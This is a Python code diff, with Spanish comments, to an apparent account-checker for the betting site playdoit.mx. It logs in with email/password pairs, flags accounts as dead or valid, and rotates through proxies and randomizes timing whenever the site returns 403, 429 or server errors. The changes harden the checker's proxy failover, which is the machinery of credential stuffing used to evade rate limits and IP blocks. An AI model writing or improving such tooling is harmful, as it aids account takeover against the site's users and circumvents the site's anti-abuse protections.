@@ -118,9 +118,12 @@ class PlaydoitClient:
                     headers={"User-Agent": self.ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                 )
                 await asyncio.sleep(random.uniform(0.3, 0.8))
+            except (httpx.TransportError, httpx.TimeoutException) as exc:
+                # Si el proxy no puede ni conectar al host, propagar como ProxyError para que rote
+                logger.warning(f"[playdoit_api] Warmup proxy error ({clean_email}): {exc}")
+                raise httpx.ProxyError(f"Warmup proxy error: {exc}")
             except Exception as e:
-                logger.warning(f"[playdoit_api] Warmup error ({clean_email}): {e}")
-                # Seguimos de todas formas
+                logger.warning(f"[playdoit_api] Warmup warning ({clean_email}): {e}")
 
             # 2. Login POST
             login_url = f"{BASE_URL}/api/login"
@@ -130,28 +133,34 @@ class PlaydoitClient:
                 "siteHost": "www.playdoit.mx",
                 "privacyPolicyChecked": "true",
             }
-            try:
-                login_resp = await client.post(
-                    login_url,
-                    data=login_data,
-                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
-                )
-            except httpx.RequestError as exc:
-                res.error = f"Network error during login: {exc}"
-                return res
+            login_resp = await client.post(
+                login_url,
+                data=login_data,
+                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
+            )
 
+            # Si el proxy recibe 403, 429 o 5xx del servidor / gateway, rotar proxy
             if login_resp.status_code in (403, 429):
-                res.error = f"HTTP {login_resp.status_code} (Rate limited or blocked)"
-                return res
+                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (IP de proxy bloqueada o rate-limited)")
+
+            if login_resp.status_code >= 500:
+                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (Error de servidor o gateway PlayDoit)")
 
             try:
                 login_json = login_resp.json()
-            except json.JSONDecodeError:
+            except Exception:
                 res.error = f"Invalid JSON response (HTTP {login_resp.status_code})"
+                res.account_dead = False
+                return res
+
+            if not isinstance(login_json, dict):
+                res.error = f"Unexpected JSON response format (HTTP {login_resp.status_code})"
+                res.account_dead = False
                 return res
 
             if not login_json.get("success"):
                 err_msg = login_json.get("message") or login_json.get("error") or "Credenciales invalidas"
+                # Solo marcar DEAD ante respuesta explícita de credenciales incorrectas en 200/401
                 res.account_dead = True
                 res.error = f"Login fallido: {err_msg}"
                 return res
@@ -269,9 +278,21 @@ async def check_playdoit_with_failover(
     async def _runner(proxy: Optional[str] = None) -> PlaydoitCheckResult:
         return await check_playdoit_account(email, password, proxy=proxy)
 
-    result, used_proxy = await call_with_proxy_failover(
-        _runner,
-        proxy_kwarg="proxy",
-        max_attempts=4,
-    )
-    return result, used_proxy
+    try:
+        result, used_proxy = await call_with_proxy_failover(
+            _runner,
+            proxy_kwarg="proxy",
+            max_attempts=4,
+        )
+        return result, used_proxy
+    except Exception as exc:
+        logger.warning(f"[playdoit_api] Todos los proxies fallaron para {email}: {exc}")
+        fail_res = PlaydoitCheckResult(
+            email=email.strip().lower(),
+            password=password,
+            ok=False,
+            account_dead=False,
+            error=f"Fallo de conexión tras reintentos con proxies: {exc}",
+        )
+        return fail_res, None
+
